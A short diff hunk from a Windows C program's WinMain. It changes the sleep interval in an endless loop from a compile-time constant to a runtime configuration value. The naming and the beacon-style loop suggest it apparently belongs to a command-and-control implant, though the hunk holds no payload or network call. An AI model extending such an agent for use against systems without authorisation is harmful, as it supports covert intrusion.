@@ -30,7 +30,7 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
 
         // Instance->Win32.WaitForSingleObjectEx( NtCurrentThread(), Instance->Config.Sleeping * 1000, FALSE );
         $$$
-        Sleep( CONFIG_SLEEP * 1000 );
+        Sleep( Instance.Config.Sleeping * 1000 );
         $$$
     } while ( TRUE );
 }
